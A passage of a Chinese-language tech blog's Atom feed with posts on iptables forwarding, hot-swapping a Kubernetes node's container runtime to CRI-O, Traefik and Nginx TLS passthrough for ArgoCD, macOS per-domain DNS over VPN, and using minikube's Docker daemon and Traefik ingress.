iptables 的 FORWARD chain 是不是被 DROP 掉了，是的話先把 Policy 改成 ACCEPT 即可</p><p>通常我們使用 Docker 去建立 Bridge 的話，這些 iptables 規則都是 Docker 幫我們處理的，所以我們現在需要自行修改 iptables。</p><h2 id="題外"><a href="#題外" class="headerlink" title="題外"></a>題外</h2><p>Docker 提供的網路選項不多，畢竟他主要是用來做資源隔離。除了以上問題沒辦法用內建的網路選項外，一個 Container 假設有多個網路環境，也沒辦法在 Container 啟動時指定預設路由，只能用比較拐彎抹角的方式在 entrypoint 或是 commands 做。</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="docker" scheme="https://blog.yiyu0x.org/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>不停機替換 Kubernetes CRI</title>
    <link href="https://blog.yiyu0x.org/2021/04/17/"/>
    <id>https://blog.yiyu0x.org/2021/04/17/</id>
    <published>2021-04-17T06:34:42.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h2><p>今天嘗試將 CRI 從預設的 dockershim 替換至 CRI-O，網路上的教學都是教你更換完畢之後使用 kubeadm 重新起一個 Cluster。但我的情境需要對現有的 Cluster 做替換，於是自己研究了一下如何不停機替換 CRI。</p><h2 id="替換-CRI"><a href="#替換-CRI" class="headerlink" title="替換 CRI"></a>替換 CRI</h2><p>首先將你需要替換的節點先設 drain</p><p><code>kubectl drain worker-node-1 --ignore-daemonsets</code></p><p>之後進入節點，將原本的 CRI dockershim 關閉</p><p><code>systemctl stop docker</code></p><p>我打算替換成 CRI-O，所以請先確定你想要替換的 CRI 已經安裝完畢，並且已經啟動：</p><p><code>systemctl status crio</code></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">● crio.service - Container Runtime Interface for OCI (CRI-O)</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/crio.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-04-17 02:25:09 EDT; 15min ago</span><br><span class="line">     Docs: https://github.com/cri-o/cri-o</span><br><span class="line"> Main PID: 22001 (crio)</span><br><span class="line">    Tasks: 21</span><br><span class="line">   Memory: 1.1G</span><br><span class="line">   CGroup: /system.slice/crio.service</span><br><span class="line">           └─22001 /usr/bin/crio</span><br></pre></td></tr></tbody></table></figure><p>接著照著網路上的教學，修改 <code>/usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf</code></p><p>並且增加</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Environment="KUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m"</span><br></pre></td></tr></tbody></table></figure><p>但是重啟 kubelet 之後會發現毫無作用（用 <code>systemctl status kubelet</code> 可以檢查啟動參數）</p><p>為何會毫無作用，是因為該檔案是 kubeadm 啟動時讀取的，但是我打算不停機所以不考慮使用 kubeadm 重啟，我打算在每一個節點上重啟 kubelet 來替換，所以需要針對 kubelet 來設定啟動參數。</p><p>於是我在該檔案找到了 EnvironmentFile 參數，並且值為 <code>/etc/sysconfig/kubelet</code></p><p>於是我在 <code>/etc/sysconfig/kubelet</code> 加入了</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m</span><br></pre></td></tr></tbody></table></figure><p>之後重啟 kubelet</p><p><code>systemctl daemon-reload</code><br><code>systemctl restart kubelet</code></p><p>可以看到啟動參數已經吃進去了</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">● kubelet.service - kubelet: The Kubernetes Node Agent</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /usr/lib/systemd/system/kubelet.service.d</span><br><span class="line">           └─10-kubeadm.conf</span><br><span class="line">   Active: active (running) since 六 2021-04-17 02:25:09 EDT; 22min ago</span><br><span class="line">     Docs: https://kubernetes.io/docs/</span><br><span class="line"> Main PID: 22114 (kubelet)</span><br><span class="line">    Tasks: 16</span><br><span class="line">   Memory: 51.2M</span><br><span class="line">   CGroup: /system.slice/kubelet.service</span><br><span class="line">           └─22114 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --network-plugin=cni --pod-infra-container-image=k8s.gcr.io/pause:3.2 --feature-gates=AllAlpha=false,RunAsGroup=true --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint=unix:///var/run/crio/crio.sock --runtime-request-timeout=5m</span><br></pre></td></tr></tbody></table></figure><p>使用</p><p><code>kubectl get node -o wide</code></p><p>也可以發現 CRI 已經更換</p><p>重新讓該節點可以被使用</p><p><code>kubectl uncordon worker-node-1</code></p><h2 id="注意事項"><a href="#注意事項" class="headerlink" title="注意事項"></a>注意事項</h2><ol><li><p>替換 Control Plane 節點時請一定要把原本的 CRI 關閉，否則系統元件會佔用你節點上的 Port，導致使用新的 CRI 無法順利將系統元件跑起來！</p></li><li><p>部署完畢後 coredns 報錯</p></li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">container_linux.go:349: starting container process caused "error adding seccomp rule for syscall socket: requested action matches default action of filter"               │   Warning  FailedCreatePodSandBox  36m  kubelet, worker-node-2  Failed to create pod sandbox: rpc error: code = Unknown desc = container create failed: time="2021-04-17</span><br><span class="line">│ T02:23:10-04:00" level=error msg="container_linux.go:349: starting container process caused \"error adding seccomp rule for syscall socket: requested action matches def  │ ault action of filter\""</span><br></pre></td></tr></tbody></table></figure><p>看到這篇：<a href="https://github.com/cri-o/cri-o/issues/4491" target="_blank" rel="noopener">https://github.com/cri-o/cri-o/issues/4491</a></p><p>將 runc 升級為 1.0.0-rc93 後解決</p><p><code>yum update runc -y</code></p><ol start="3"><li>部署完畢後發現 busybox 不能使用 ping（權限不足），增加 CRI-O 的 capabilities，預設只有</li></ol><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">default_capabilities = [</span><br><span class="line">  "CHOWN",</span><br><span class="line">  "DAC_OVERRIDE",</span><br><span class="line">  "FSETID",</span><br><span class="line">  "FOWNER",</span><br><span class="line">  "SETGID",</span><br><span class="line">  "SETUID",</span><br><span class="line">  "SETPCAP",</span><br><span class="line">  "NET_BIND_SERVICE",</span><br><span class="line">  "KILL",</span><br><span class="line">]</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
  </entry>
  
  <entry>
    <title>一次 Traefik 與 TLS 的踩雷經驗</title>
    <link href="https://blog.yiyu0x.org/2021/03/26/"/>
    <id>https://blog.yiyu0x.org/2021/03/26/</id>
    <published>2021-03-26T10:07:37.000Z</published>
    <updated>2025-04-12T20:59:43.591Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="問題點"><a href="#問題點" class="headerlink" title="問題點"></a>問題點</h2><p>部署 ArgoCD 進 Kubernetes 完畢時，發現 ArgoCD 開了 80, 443 兩個 Service Port，對應到的 Container Port 都同樣是 8080。如果你用 http 請求 ArgoCD 的 Web 時，他會請你跳轉到 https。</p><p>為了讓外部的 User 可以使用 ArgoCD，我設定了 Traefik 的 IngressRoute 來存取該資源，但是卻一直沒有成功。</p><p>我的架構環境為</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                    |</span><br><span class="line">Nginx-proxy（外部）  | -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)</span><br><span class="line">                    |</span><br></pre></td></tr></tbody></table></figure><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><h3 id="IngressRoute"><a href="#IngressRoute" class="headerlink" title="IngressRoute"></a>IngressRoute</h3><p>為了簡化環境（debug），於是我從 Cluster 內部去打 Ingress，發現回應一直都是 404，但是我把 Service 做 port forward 到 local 端，卻可以正常運作，所以推測是 ArgoCD 的 IngressRoute 規則有誤，而我使用的規則是ArgoCD 官方文件提到的：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">traefik.containo.us/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">IngressRoute</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">argocd</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  entryPoints:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">websecure</span></span><br><span class="line"><span class="attr">  routes:</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">      match:</span> <span class="string">Host(`argocd.example.com`)</span></span><br><span class="line"><span class="attr">      priority:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">      services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">          port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">      match:</span> <span class="string">Host(`argocd.example.com`)</span> <span class="string">&&</span> <span class="string">Headers(`Content-Type`,</span> <span class="string">`application/grpc`)</span></span><br><span class="line"><span class="attr">      priority:</span> <span class="number">11</span></span><br><span class="line"><span class="attr">      services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">          port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">          scheme:</span> <span class="string">h2c</span></span><br><span class="line"><span class="attr">  tls:</span></span><br><span class="line"><span class="attr">    certResolver:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">    options:</span> <span class="string">{}</span></span><br></pre></td></tr></tbody></table></figure><p>於是我使用（從 Cluster 節點上直接打 Ingress）</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl https://argocd.example.com -k</span><br><span class="line">> href="https://argocd.example.com/">Temporary Redirect</a>.</span><br><span class="line"></span><br><span class="line">curl https://argocd.example.com -k -L</span><br><span class="line">> curl: (47) Maximum (50) redirects followed</span><br></pre></td></tr></tbody></table></figure><p>我查了 Traefik 的官方文件發現</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">There are 3 ways to configure the backend protocol for communication between Traefik and your pods:</span><br><span class="line"></span><br><span class="line">    Setting the scheme explicitly (http/https/h2c)</span><br><span class="line">    Configuring the name of the kubernetes service port to start with https (https)</span><br><span class="line">    Setting the kubernetes service port to use port 443 (https)</span><br><span class="line"></span><br><span class="line">If you do not configure the above, Traefik will assume an http connection.</span><br></pre></td></tr></tbody></table></figure><p>簡單來說，Treafik 並不會因為你使用 https 去打 Ingress，就使用該協定幫你打後端的 Pod (or Service)，如果你指定 Service 為 443 Port 那麼他就幫你用 https 去跟後端的 Pod 建立連線，而預設都是走 http 連線。</p><p>所以應該將 yaml 檔案改為</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">routes:</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">    match:</span> <span class="string">Host(`argocd.example.com`)</span></span><br><span class="line"><span class="attr">    priority:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">    services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">        port:</span> <span class="number">443</span></span><br></pre></td></tr></tbody></table></figure><p>或是指定 protocol</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">routes:</span></span><br><span class="line"><span class="attr">    - kind:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">    match:</span> <span class="string">Host(`argocd.tcs-proxy.cscc`)</span></span><br><span class="line"><span class="attr">    priority:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">    services:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">argocd-server</span></span><br><span class="line"><span class="attr">        port:</span> <span class="number">80</span></span><br><span class="line"><span class="attr">        scheme:</span> <span class="string">https</span></span><br></pre></td></tr></tbody></table></figure><p>來強制 IngressRoute 與 ArgoCD 使用 https 建立連線。</p><p>另外，因為 ArgoCD 的憑證是自行簽發的，Traefik 並認不得該單位，所以 Traefik 必須設定 <code>--serversTransport.insecureSkipVerify=true</code> 來忽略憑證的驗證</p><h3 id="Reverse-Proxy-to-Cluster"><a href="#Reverse-Proxy-to-Cluster" class="headerlink" title="Reverse Proxy to Cluster"></a>Reverse Proxy to Cluster</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                    |</span><br><span class="line">Nginx-proxy（外部）  |  -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)</span><br><span class="line">                    |</span><br></pre></td></tr></tbody></table></figure><p>我的情境中，Cluster 外部還有一台 Load Balancer 會將流量導致 Cluster 的 Worker Nodes，但是 Traefik 已經有憑證了，後端的 ArgoCD 也有，我並不想要有這麼多的憑證會造成連線的效能耗損，於是查到可以使用 tls passthrough 的方式來讓 Nginx 不處理封包的加密解密，直接將該封包 reverse proxy 到後端。</p><p>但是該方式會產生一個問題，Nginx 如果不做解密，那麼也看不到封包 L7 的 Host 欄位，於是原本的 virtual host 方式就無法正常路由，解決方式為使用 TLS 的 SNI 來判斷路由。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">stream {</span><br><span class="line">    map $ssl_preread_server_name $name {</span><br><span class="line">        # 在此設定不同 SNI 對應到不同後端;</span><br><span class="line">        argocd.tcs-proxy.cscc K8S_WORKER_443;</span><br><span class="line">        default https_default_backend;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    upstream K8S_WORKER_443 {</span><br><span class="line">        server worker-node-1:443;</span><br><span class="line">        server worker-node-2:443;</span><br><span class="line">        server worker-node-3:443;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    server {</span><br><span class="line">        listen 443;</span><br><span class="line">        proxy_pass $name; # 如果沒有路由需求，也可以直接設定 proxy_pass K8S_WORKER_443;</span><br><span class="line">        ssl_preread on; # 該選項需要打開，才有辦法讀取 SNI</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>要注意的是，通常 Nginx 的設定都會在 http directive，但是 tls passthrough 必須要設定在 stream directive 下，意味著原本的 log formatter 也無法使用了（可以去 nginx.conf 看一下）。</p><p>所以我們必須增加新的 log formatter 在 steam directive 下方</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stream {</span><br><span class="line">    log_format proxy '$remote_addr - [$time_local] '</span><br><span class="line">                    '$protocol $status $bytes_sent $bytes_received '</span><br><span class="line">                    '$session_time "$upstream_addr" '</span><br><span class="line">                    '"$upstream_bytes_sent" "$upstream_bytes_received" "$upstream_connect_time" '</span><br><span class="line">                    '$remote_addr $remote_port $server_addr $server_port';</span><br><span class="line">    server {</span><br><span class="line">        access_log      /var/log/tcp-stream-access.log proxy;</span><br><span class="line">        #...</span><br><span class="line">        #...</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如此一來會發現外層的 Nginx 沒有上憑證也可以正常使用叢集內部憑證來對連線進行加密！</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
      <category term="traefik" scheme="https://blog.yiyu0x.org/tags/traefik/"/>
    
      <category term="nginx" scheme="https://blog.yiyu0x.org/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>macOS-中-VPN-解析域名錯誤</title>
    <link href="https://blog.yiyu0x.org/2021/01/06/"/>
    <id>https://blog.yiyu0x.org/2021/01/06/</id>
    <published>2021-01-06T11:01:45.000Z</published>
    <updated>2025-04-12T20:59:43.589Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><p>macOS 中的 DNS 順序並沒有意義（儘管系統還讓你移動順序），決定 DNS Server 使用隨機方式來選擇。如果想要指定特定網域使用特定的 DNS Server，請使用 <code>scutil</code> 指令設定。</p><p><code>/etc/resolv.conf</code> 的 nameserver 順序也相同沒有意義，系統採隨機方式選擇 nameserver。</p><h1 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h1><p>連上實驗室的 VPN 後，發現 VPN 中的 domain 都解析失敗，但是 dig 卻是正常的。看了一下 DNS 設定也都正常，於是開始找原因……</p><h1 id="DNS-解析問題"><a href="#DNS-解析問題" class="headerlink" title="DNS 解析問題"></a>DNS 解析問題</h1><p>假設今天我要解析 website.mydomain.org（內網），我的 <code>/etc/resolve.conf</code> 如下</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search mydomain.org</span><br><span class="line">nameserver 10.0.0.1 # 內網 DNS 1</span><br><span class="line">nameserver 10.0.0.2 # 內網 DNS 2</span><br><span class="line">nameserver 1.1.1.1</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></tbody></table></figure><p>此時有機率輪到後面兩組，造成解析失敗，所以我們需要額外設定</p><h1 id="解決"><a href="#解決" class="headerlink" title="解決"></a>解決</h1><p>列出本機上 dns 設定</p><p><code>scutil --dns</code></p><p>我們需要針對特定的網域使用特定的 DNS Server 來解析</p><p>首先建立目錄，位置必須是 <code>/etc/resolver</code></p><p><code>sudo mkdir /etc/resolver</code></p><p>裡面的檔名依照 domain 去設定，假設我要指定 mydomain.org 下的 nameserver，我的檔名就是 <code>mydomain.org</code></p><p>接者把該 domain 用到的 nameserver 寫上，格式與 <code>/etc/resolv.conf</code> 一樣</p><p><code>echo 'nameserver 10.0.0.1' > /etc/resolver/mydomain.org</code><br><code>echo 'nameserver 10.0.0.2' > /etc/resolver/mydomain.org</code></p><p>設定之後再度訪問 <code>website.mydomain.org</code> 就可以正常解析了</p><h3 id="參考"><a href="#參考" class="headerlink" title="參考"></a>參考</h3><ul><li><a href="https://medium.com/@jamieeduncan/i-recently-moved-to-a-macbook-for-my-primary-work-laptop-7c704dbaff59" target="_blank" rel="noopener">Domain-specific DNS server on your Macbook Pro</a></li></ul></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="macOS" scheme="https://blog.yiyu0x.org/tags/macOS/"/>
    
      <category term="DNS" scheme="https://blog.yiyu0x.org/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>與 minikube 共享 local docker image</title>
    <link href="https://blog.yiyu0x.org/2020/08/31/"/>
    <id>https://blog.yiyu0x.org/2020/08/31/</id>
    <published>2020-08-31T12:27:41.000Z</published>
    <updated>2025-04-12T20:59:43.596Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>為了將服務跑在 K8s 中，容器化是必須的。在程式即將部署之際，會需要測試一些 K8s 中的環境變數是否可以被程式正常讀取，或是為了符合 K8s 環境，將程式打包成容器映像試著部署上叢集試試看有沒有問題。這個過程的工作流大致上如下：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打包 (docker build . -t my-app:0.1)</span><br><span class="line">部署 (kubectl apply -f deploy.yaml)</span><br><span class="line">確認是否有問題，有的話修改程式，然後繞回第一步</span><br></pre></td></tr></tbody></table></figure><p>我們在 Local 開發時，可能會使用 minikube 來當作測試用的部署環境，但是 minikube 實際上是起一個新的 docker-daemon，他並不認識 macOS 或是 Linux 上的 docker-daemon。也就是說，你在 Local 將 image build 完畢，在 minikube 中並無法存取 Local 的 Docker Registry。這對於正在快速開發測試的人來說極為不便，我們很可能改一行 code 就需要馬上看是否在 K8s 環境能正常運作。</p><p>要解決這個問題大致上有幾種方法：</p><ol><li>使用外部 Docker Hub 來當作 Docker Registry<br> 缺點：暴露在外網、外網流量慢</li><li>在 Local 跑一個 Docker Registry，讓 Local 與 minikube 共用<br> 缺點：Local IP 如果換掉，yaml 設定檔的 image 位置又要重寫</li><li>在 minikube 環境中跑一個 Docker Registry，port-forward 到 Local 上<br> 缺點：第一次設定較繁瑣，但大致上已經算好用</li></ol><p>這邊要提的方法個人覺得較方便，但同時也有一些不方便的地方</p><p>該方法原理是直接在 build image 時直接存進 minikube 的 Registry 中</p><p>方法如下：</p><p><code>eval $(minikube docker-env)</code></p><p><code>docker build -t my-app .</code></p><p>此時可以用 <code>minikube ssh</code> 進去看 <code>docker images</code> 會發現 Image 已經進到 Registry 中</p><p>最後在 yaml 檔有用到該 image 的地方加上</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imagePullPolicy:</span> <span class="string">Never</span></span><br></pre></td></tr></tbody></table></figure><p>確保在 pull image 時只會拉 Local 的 Image</p><p>該方法是透過重新指定環境變數來改變 docker 指令操作 docker-deamon 的位置</p><p>所以開一個新的 session 就要重新設定一次，算是一個小缺點</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="kubernetes" scheme="https://blog.yiyu0x.org/tags/kubernetes/"/>
    
      <category term="docker" scheme="https://blog.yiyu0x.org/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>在 K8S 中使用 Traefik 作為 Ingress Controllers</title>
    <link href="https://blog.yiyu0x.org/2020/07/11/"/>
    <id>https://blog.yiyu0x.org/2020/07/11/</id>
    <published>2020-07-11T07:53:37.000Z</published>
    <updated>2025-04-12T20:59:43.592Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>K8S 中的 Ingress Controllers 並沒有實作，可以自己使用各種版本。在 Minikube 中的 Ingress Controllers 預設是用 <a href="https://kubernetes.github.io/ingress-nginx/" target="_blank" rel="noopener">NGINX Ingress Controller</a>，然而 NGINX Ingress Controller 的功能非常陽春，官網有提供一系列的 <a href="https://kubernetes.io/docs/concepts/services-networking/ingress-controllers/" target="_blank" rel="noopener">Ingress Controller</a> 給各位參考，該文章紀錄如何使用 <a href="https://docs.traefik.io/" target="_blank" rel="noopener">Traefik</a> 這個 Edge Router 作為 Ingress Controller。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在操作 K8S 之前請先確定你正在操作的叢集是練習環境：</p><p><code>kubectl cluster-info</code></p><p>Traefik 這套工具可以將外部的流量吸收，並且透過自己定義的路由來將流量往內部的 Service 打。我們希望可以透過 URL 的 Path 來定義不同服務的路由，將流量打向不同的服務。</p><p>在 NGINX Ingress Controller 中要做這件事情，要在 <code>annotations</code> 中加上 <code>nginx.ingress.kubernetes.io/rewrite-target: /</code></p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Ingress</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  annotations:</span></span><br><span class="line">    <span class="string">nginx.ingress.kubernetes.io/rewrite-target:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">rewrite</span></span><br><span class="line"><span class="attr">  namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></tbody></table></figure><p>避免不同 App 吃到不同的路由位置無法產生正確的回應（假設我們的服務入口都在根路徑 Ex: <code>app-foo/</code> ）。</p><p>但 Traefik 要達成這件事情必須透過 <a href="https://docs.traefik.io/middlewares/overview/" target="_blank" rel="noopener">Middleware</a> 這個組件（Traefik 定義的功能），簡單來說我們要把讀進來的 /path，strip 掉並且將導向到指定的 Service 上。</p><p><img src="https://docs.traefik.io/assets/img/middleware/overview.png" alt></p><p>要使用 Traefik Middleware 有兩種方式：</p><ul><li>IngressRoute (CustomResourceDefinitions)</li><li>在 Ingress 中使用 annotation 定義</li></ul><p>個人覺得第二點比較直覺，所以選擇第二種方式。</p><p>首先，先建立 Middleware 這個 CRD，並且做 ClusterRoleBinding：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 